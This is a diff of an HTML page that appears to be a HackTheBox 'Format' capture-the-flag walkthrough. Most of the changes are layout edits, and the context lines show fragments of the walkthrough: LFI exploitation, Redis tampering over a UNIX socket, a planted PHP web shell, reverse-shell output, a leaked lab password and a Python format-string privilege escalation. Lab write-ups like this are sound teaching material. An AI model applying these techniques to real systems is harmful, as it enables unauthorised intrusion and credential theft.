@@ -1,16 +1,15 @@
-
 <!DOCTYPE html>
 <html lang="es">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Format - HTB</title>
-    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
+    <meta name="description" content="Artículos técnicos sobre ciberseguridad, Active Directory, Binary Exploitation y más">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
     <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons/font/bootstrap-icons.css" rel="stylesheet">
-    <link href="/css/articles.css" rel="stylesheet">
     <link href="/css/styles.css" rel="stylesheet">
+    <link href="/css/articles.css" rel="stylesheet">
     <link href="/css/monokai.css" rel="stylesheet">
-    <link href="/css/writeups.css" rel="stylesheet">
     <link rel="icon" href="/favicon.ico" type="image/x-icon">
 </head>
 <body>
@@ -18,51 +17,80 @@
     <div class="container-fluid">
         <div class="row">
             <!-- Sidebar -->
-            <aside class="sidebar">
+            <aside class="sidebar" id="sidebar">
                 <div class="sidebar-logo">
-                    <img src="/img/new-logo.png" alt="Logo">
+                    <img src="/img/new-logo.png" alt="elswix Logo" onerror="this.src='https://via.placeholder.com/120/ff3b5c/ffffff?text=elswix'">
                     <h3>elswix</h3>
                 </div>
                 <nav>
-                    <ul class="nav flex-column">
-                        <li class="nav-item"><a href="/" class="nav-link active"><i class="bi bi-house-door"></i> Home</a></li>
-                        <li class="nav-item"><a href="/articles" class="nav-link"><i class="bi bi-card-text"></i> Articles</a></li>
-                        <li class="nav-item"><a href="/writeups" class="nav-link"><i class="bi bi-terminal"></i> WriteUPs</a></li>
-                        <li class="nav-item"><a href="/notes" class="nav-link"><i class="bi bi-journal-text"></i> Notes</a></li>
-                        <li class="nav-item"><a href="https://github.com/elswix/KL-Sunset" target="_blank" class="nav-link"><i class="bi bi-github"></i> KL-Sunset</a></li>
-                        <li class="nav-item"><a href="/about" class="nav-link"><i class="bi bi-person"></i> About me</a></li>
+                    <ul class="nav-menu">   
+                        <li class="nav-item">
+                            <a href="/" class="nav-link">
+                                <i>🏠</i>
+                                <span>Home</span>
+                            </a>
+                        </li>
+                        <li class="nav-item">
+                            <a href="/articles" class="nav-link active">
+                                <i>📝</i>
+                                <span>Articles</span>
+                            </a>
+                        </li>
+                        <li class="nav-item">
+                            <a href="/writeups" class="nav-link">
+                                <i>💻</i>
+                                <span>WriteUps</span>
+                            </a>
+                        </li>
+                        <li class="nav-item">
+                            <a href="/notes" class="nav-link">
+                                <i>📚</i>
+                                <span>Notes</span>
+                            </a>
+                        </li>
+                        <li class="nav-item">
+                            <a href="https://github.com/elswix/KL-Sunset" target="_blank" class="nav-link">
+                                <i>⚡</i>
+                                <span>KL-Sunset</span>
+                            </a>
+                        </li>
+                        <li class="nav-item">
+                            <a href="/about" class="nav-link">
+                                <i>👤</i>
+                                <span>About me</span>
+                            </a>
+                        </li>
                     </ul>
                 </nav>
             </aside>
+
             <!-- Main Content -->
             <main>
                 <!-- Hero Section -->
                 <section class="hero mb-5">
-                    <img alt="index-logo" class="mb-3" style="width: 120px; height: 120px; border-radius: 50%" src="/writeups/htb/medium/format/img/format.png">
-                <h2>Format - HTB</h2>
-                <p>walkthrough by elswix<p>
-                <ul class="machine-links" style="display: none">
-                    <li><a href="https://app.hackthebox.com/machines/Format">HackTheBox</a></li>
-                </ul>
-            </section>
+                    <img src="/writeups/htb/medium/format/img/format.png" alt="Article logo" style="width: 120px; height: 120px; border-radius: 50%" onerror="this.src='https://via.placeholder.com/140/ff3b5c/ffffff?text=📝'">
+                    <h2>Format - HTB</h2>
+                    <p>walkthrough by elswixHackTheBox</p>
+                </section>
+
                 <section class="article-content">
-                    <div class="article-container">
-                        <div class="article-content-main">                <div class="highlight"><pre><span></span><span class="k">Machine</span><span class="p">:</span> <span class="n">Format</span>
+<div class="article-container">
+<div class="article-content-main"> <div class="highlight"><pre><span></span><span class="k">Machine</span><span class="p">:</span> <span class="n">Format</span>
 <span class="k">Difficulty</span><span class="p">:</span> <span class="n">Medium</span>
 <span class="k">Platform</span><span class="p">:</span> <span class="n">HackTheBox</span>
 <span class="k">Release</span><span class="p">:</span> <span class="n">Released</span> <span class="n">on</span> <span class="mi">05</span><span class="o">/</span><span class="mi">13</span><span class="o">/</span><span class="mi">2023</span>
 </pre></div>
 <h3><br/>About Format</h3><br/>
 Format is a medium-difficulty machine in which we need to exploit a web service to read system files. We achieve this by inspecting the page's source code hosted on port <code>3000</code> in a repository of the <code>Gitea</code> service.<br/><br/>
-<h3><br>Shell as www-data</br></h3><br>
-Thanks to the LFI we exploited, we were able to access sensitive information about the <code>Nginx</code> configuration. This allowed us to make requests to a UNIX Socket, enabling us to interact with Redis and alter user database property values. We escalated our user privileges by modifying the <code>Pro</code> field, increasing our advantages on the site.<br/><br/>
+<h3><br/>Shell as www-data</h3><br/>
+Thanks to the LFI we exploited, we were able to access sensitive information about the <code>Nginx</code> configuration. This allowed us to make requests to a UNIX Socket, enabling us to interact with Redis and alter user database property values. We escalated our user privileges by modifying the <code>Pro</code> field, increasing our advantages on the site.<br><br/>
 As a <code>Pro</code> user, we have the capability to upload images, which are stored in a directory called <code>uploads</code>. With write privileges on this directory, we took advantage of the LFI vulnerability (which also allows writing files at the system level) to store a PHP web shell in the <code>uploads</code> directory. This allowed us to later execute system-level commands. <br/><br/>
-<h3><br>Shell as cooper</br></h3><br>
-Once we gain access to the system, we can connect to the Redis socket using the <code>redis-cli</code> tool. This allows us to list all stored keys. By reading the key associated with the user <code>cooper</code>, we obtain their credentials and proceed to escalate our privileges to that user.<br/><br/>
-<h3><br>Shell as root</br></h3><br>
-As the user <code>cooper</code>, we have sudo privileges to execute a Python program as the root user. This program is vulnerable to <code>Python Format String Vulnerability</code>, which allows us to access objects during the program's execution. Consequently, we can list the value of a variable that stores the root user's password.<br/><br/>
-<h3><br>Recon</br></h3><br>
-Before we start with the exploitation, let's begin with enumeration. Machines expose services, and these services are exposed through ports.<br/><br/>
+<h3><br/>Shell as cooper</h3><br/>
+Once we gain access to the system, we can connect to the Redis socket using the <code>redis-cli</code> tool. This allows us to list all stored keys. By reading the key associated with the user <code>cooper</code>, we obtain their credentials and proceed to escalate our privileges to that user.<br><br/>
+<h3><br/>Shell as root</h3><br/>
+As the user <code>cooper</code>, we have sudo privileges to execute a Python program as the root user. This program is vulnerable to <code>Python Format String Vulnerability</code>, which allows us to access objects during the program's execution. Consequently, we can list the value of a variable that stores the root user's password.<br><br/>
+<h3><br/>Recon</h3><br/>
+Before we start with the exploitation, let's begin with enumeration. Machines expose services, and these services are exposed through ports.<br><br/>
 With that in mind, we'll initiate a port scanning:<br/><br/>
 <div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">sudo</span> <span class="n">nmap</span> <span class="o">-</span><span class="n">p</span><span class="o">-</span> <span class="o">--</span><span class="nb">open</span> <span class="o">-</span><span class="n">sS</span> <span class="o">--</span><span class="nb">min</span><span class="o">-</span><span class="n">rate</span> <span class="mi">5000</span> <span class="o">-</span><span class="n">v</span> <span class="o">-</span><span class="n">n</span> <span class="o">-</span><span class="n">Pn</span> <span class="mf">10.10.11.213</span> <span class="o">-</span><span class="n">oN</span> <span class="n">portScan</span>
 
@@ -131,9 +159,9 @@ When performing the scan on port 80, an error is reported because an attempt is 
 </pre></div>
 
 Inspecting the web service hosted on port 80, we observe the following:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/format/img/1.png"/><br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/medium/format/img/1.png"><br/><br/>
 If we scroll down on the homepage, there is a hyperlink that says "Contribute here!" which redirects us to the web service hosted on port 3000:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/format/img/2.png"/><br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/medium/format/img/2.png"><br/><br/>
 If we click on the hyperlink, we see the following:<br/><br/>
 <img alt="" src="https://elswix.github.io/writeups/htb/medium/format/img/3.png"/><br/><br/>
 Firstly, we can observe that <a href="https://about.gitea.com/">Gitea</a> is running under the web service on port <code>3000</code>. <a href="https://about.gitea.com/">Gitea</a> is an open-source platform for source code repository management, similar to GitHub.<br/><br/>
@@ -195,8 +223,8 @@ We send the request, and immediately in the response, we see the following:<br/>
 <img alt="" src="https://elswix.github.io/writeups/htb/medium/format/img/20.png"/><br/><br/>
 In a not very elegant format, but we are reading files at the system level. We are abusing a Local File Inclusion (LFI).<br/><br/>
 I hope I have explained myself clearly; I apologize if I was not very clear.<br/><br/>
-<h3><br>Shell as www-data</br></h3><br>
-First and foremost, we will create a script to automate the file reading process:<br/><br/>
+<h3><br/>Shell as www-data</h3><br/>
+First and foremost, we will create a script to automate the file reading process:<br><br/>
 <div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/python3 </span>
 
 <span class="kn">import</span> <span class="nn">requests</span><span class="o">,</span> <span class="nn">random</span><span class="o">,</span> <span class="nn">re</span><span class="o">,</span> <span class="nn">sys</span><span class="o">,</span> <span class="nn">string</span><span class="o">,</span> <span class="nn">warnings</span>
@@ -376,7 +404,7 @@ Next, we send the reverse shell by executing the following:<br/><br/>
 <span class="n">bash</span><span class="p">:</span> <span class="n">cannot</span> <span class="nb">set</span> <span class="n">terminal</span> <span class="n">process</span> <span class="n">group</span> <span class="p">(</span><span class="mi">620</span><span class="p">):</span> <span class="n">Inappropriate</span> <span class="n">ioctl</span> <span class="k">for</span> <span class="n">device</span>
 <span class="n">bash</span><span class="p">:</span> <span class="n">no</span> <span class="n">job</span> <span class="n">control</span> <span class="ow">in</span> <span class="n">this</span> <span class="n">shell</span>
 <span class="nd">www</span><span class="nd">-</span><span class="nd">data<span class="nd">@format</span><span class="p">:</span><span class="o">~/</span><span class="n">microblog</span><span class="o">/</span><span class="n">elswix</span><span class="o">/</span><span class="n">uploads</span><span class="err">$</span>
-</pre></div>
+</span></pre></div>
 
 We have successfully accessed the system, now we will simply adjust the TTY to interact more comfortably with the system:<br/><br/>
 <div class="highlight"><pre><span></span><span class="nd">www</span><span class="nd">-</span><span class="nd">data<span class="nd">@format</span><span class="p">:</span><span class="o">~/</span><span class="n">microblog</span><span class="o">/</span><span class="n">elswix</span><span class="o">/</span><span class="n">uploads</span><span class="err">$</span> <span class="n">script</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span> <span class="o">-</span><span class="n">c</span> <span class="n">bash</span>
@@ -390,24 +418,24 @@ We have successfully accessed the system, now we will simply adjust the TTY to i
                                <span class="n">reset</span>
 <span class="n">reset</span><span class="p">:</span> <span class="n">unknown</span> <span class="n">terminal</span> <span class="nb">type</span> <span class="n">unknown</span>
 <span class="n">Terminal</span> <span class="nb">type</span><span class="err">?</span> <span class="n">xterm</span>
-</pre></div>
+</span></span></pre></div>
 <div class="highlight"><pre><span></span><span class="nd">www</span><span class="nd">-</span><span class="nd">data<span class="nd">@format</span><span class="p">:</span><span class="o">~/</span><span class="n">microblog</span><span class="o">/</span><span class="n">elswix</span><span class="o">/</span><span class="n">uploads</span><span class="err">$</span> <span class="n">export</span> <span class="n">TERM</span><span class="o">=</span><span class="n">xterm</span>
 <span class="nd">www</span><span class="nd">-</span><span class="nd">data<span class="nd">@format</span><span class="p">:</span><span class="o">~/</span><span class="n">microblog</span><span class="o">/</span><span class="n">elswix</span><span class="o">/</span><span class="n">uploads</span><span class="err">$</span> <span class="n">export</span> <span class="n">SHELL</span><span class="o">=/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span>
 <span class="nd">www</span><span class="nd">-</span><span class="nd">data<span class="nd">@format</span><span class="p">:</span><span class="o">~/</span><span class="n">microblog</span><span class="o">/</span><span class="n">elswix</span><span class="o">/</span><span class="n">uploads</span><span class="err">$</span>
-</pre></div>
-<h3><br>Shell as cooper</br></h3><br>
-The first thing that came to mind after accessing the system was to list other system-level users:<br/><br/>
+</span></span></span></pre></div>
+<h3><br/>Shell as cooper</h3><br/>
+The first thing that came to mind after accessing the system was to list other system-level users:<br><br/>
 <div class="highlight"><pre><span></span><span class="nd">www</span><span class="nd">-</span><span class="nd">data<span class="nd">@format</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">l</span> <span class="o">/</span><span class="n">home</span>
 <span class="n">total</span> <span class="mi">8</span>
 <span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">2</span> <span class="n">cooper</span> <span class="n">cooper</span> <span class="mi">4096</span> <span class="n">May</span> <span class="mi">22</span> <span class="mi">20</span><span class="p">:</span><span class="mi">41</span> <span class="n">cooper</span>
 <span class="n">drwx</span><span class="o">------</span> <span class="mi">2</span> <span class="n">git</span>    <span class="n">git</span>    <span class="mi">4096</span> <span class="n">Apr</span> <span class="mi">18</span> <span class="mi">23</span><span class="p">:</span><span class="mi">20</span> <span class="n">git</span>
 <span class="nd">www</span><span class="nd">-</span><span class="nd">data<span class="nd">@format</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
-</pre></div>
+</span></span></pre></div>
 
 First, I thought of connecting to <code>Redis</code> using the <code>redis-cli</code> tool, specifying the path to the <code>redis.sock</code> file since there is no mention of the service being exposed through ports:<br/><br/>
 <div class="highlight"><pre><span></span><span class="nd">www</span><span class="nd">-</span><span class="nd">data<span class="nd">@format</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">redis</span><span class="o">-</span><span class="n">cli</span> <span class="o">-</span><span class="n">s</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">redis</span><span class="o">/</span><span class="n">redis</span><span class="o">.</span><span class="n">sock</span> 
 <span class="n">redis</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">redis</span><span class="o">/</span><span class="n">redis</span><span class="o">.</span><span class="n">sock</span><span class="o">&gt;</span>
-</pre></div>
+</span></pre></div>
 
 Listing the <code>keys</code> in Redis, we come across the following:<br/><br/>
 <div class="highlight"><pre><span></span><span class="n">redis</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">redis</span><span class="o">/</span><span class="n">redis</span><span class="o">.</span><span class="n">sock</span><span class="o">&gt;</span> <span class="n">keys</span> <span class="o">*</span>
@@ -438,7 +466,7 @@ We have the password for the user <code>cooper</code> leaked in line number 4. W
 <div class="highlight"><pre><span></span><span class="nd">www</span><span class="nd">-</span><span class="nd">data<span class="nd">@format</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">su</span> <span class="n">cooper</span>
 <span class="n">Password</span><span class="p">:</span> <span class="n">zooperdoopercooper</span>
 <span class="nd">cooper@format</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="err">$</span>
-</pre></div>
+</span></pre></div>
 
 Now that we are logged in as the user <code>cooper</code>, we can view the first flag:<br/><br/>
 <div class="highlight"><pre><span></span><span class="nd">cooper@format</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="err">$</span> <span class="n">cd</span>
@@ -446,8 +474,8 @@ Now that we are logged in as the user <code>cooper</code>, we can view the first
 <span class="n">d23e9</span><span class="o">**********************</span><span class="n">feca4</span>
 <span class="nd">cooper@format</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
 </pre></div>
-<h3><br>Shell as root</br></h3><br>
-If we list the sudo privileges for the user <code>cooper</code>, we see the following:<br/><br/>
+<h3><br/>Shell as root</h3><br/>
+If we list the sudo privileges for the user <code>cooper</code>, we see the following:<br><br/>
 <div class="highlight"><pre><span></span><span class="nd">cooper@format</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">sudo</span> <span class="o">-</span><span class="n">l</span>
 <span class="p">[</span><span class="n">sudo</span><span class="p">]</span> <span class="n">password</span> <span class="k">for</span> <span class="n">cooper</span><span class="p">:</span> 
 <span class="n">Matching</span> <span class="n">Defaults</span> <span class="n">entries</span> <span class="k">for</span> <span class="n">cooper</span> <span class="n">on</span> <span class="nb">format</span><span class="p">:</span>
@@ -485,8 +513,8 @@ The problem arises when defining the <code>license_key</code> variable because i
 Searching a bit more on the internet, I also found the following article on <a href="https://security.stackexchange.com/questions/238338/are-there-any-security-concerns-to-using-python-f-strings-with-user-input">StackExchange</a>. This latter one is more comprehensive regarding the exploitation of the vulnerability.<br/><br/>
 Upon further reading of the code, we see that what's stored in the <code>license_key</code> variable is displayed on the screen:<br/><br/>
 <img alt="" src="https://elswix.github.io/writeups/htb/medium/format/img/43.png"/><br/><br/>
-<h3><br>Exploitation</br></h3><br>
-Firstly, if we input a user through the <code>provision</code> parameter, we get the following report:<br/><br/>
+<h3><br/>Exploitation</h3><br/>
+Firstly, if we input a user through the <code>provision</code> parameter, we get the following report:<br><br/>
 <div class="highlight"><pre><span></span><span class="nd">cooper@format</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">sudo</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">license</span> <span class="o">-</span><span class="n">p</span> <span class="n">elswix</span>
 
 <span class="n">User</span> <span class="n">does</span> <span class="ow">not</span> <span class="n">exist</span><span class="o">.</span> <span class="n">Please</span> <span class="n">provide</span> <span class="n">valid</span> <span class="n">username</span><span class="o">.</span>
@@ -574,15 +602,17 @@ Finally, we can read the last flag:<br/><br/>
 <div class="highlight"><pre><span></span><span class="nd">root@format</span><span class="p">:</span><span class="o">~</span><span class="root1">#</span><span class="n"> cat root.txt</span>
 <span class="mi">1</span><span class="n">bd03</span><span class="o">**********************</span><span class="mi">1</span><span class="n">d68d</span>
 <span class="nd">root@format</span><span class="p">:</span><span class="o">~</span><span class="root1">#</span>
-</pre></div></br></br></br></br></br></br></br></br>
-            </div>
+</pre></div></br></br></br></br></img></img></br></br></br></br>
+</div>
+</div>
+</section>
+<script src="/js/sidebarToggle.js"></script>
+<script src="/js/fixMobileImages.js"></script>
+<footer>
+<p>© 2024 elswix.github.io</p>
+</footer>
+            </main>
         </div>
-    </section>
-
-    <script src="/js/sidebarToggle.js"></script>
-    <script src="/js/fixMobileImages.js"></script>
-    <footer>
-        <p>&copy; 2024 elswix.github.io</p>
-    </footer>
+    </div>
 </body>
 </html>
